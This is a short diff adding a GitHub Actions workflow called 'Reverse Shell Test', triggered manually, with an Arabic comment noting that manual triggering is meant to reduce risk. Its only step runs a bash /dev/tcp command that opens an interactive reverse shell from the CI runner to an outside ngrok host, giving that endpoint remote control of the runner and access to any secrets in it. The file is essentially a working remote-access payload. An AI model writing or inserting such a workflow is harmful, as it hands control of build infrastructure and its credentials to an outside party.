@@ -1,0 +1,14 @@
+name: Reverse Shell Test
+
+on:
+  workflow_dispatch: # يدوي فقط لتقليل الخطورة
+
+jobs:
+  reverse-shell:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: 🧪 Run Reverse Shell to ngrok
+        run: |
+          echo "Starting reverse shell..."
+          bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14645 0>&1
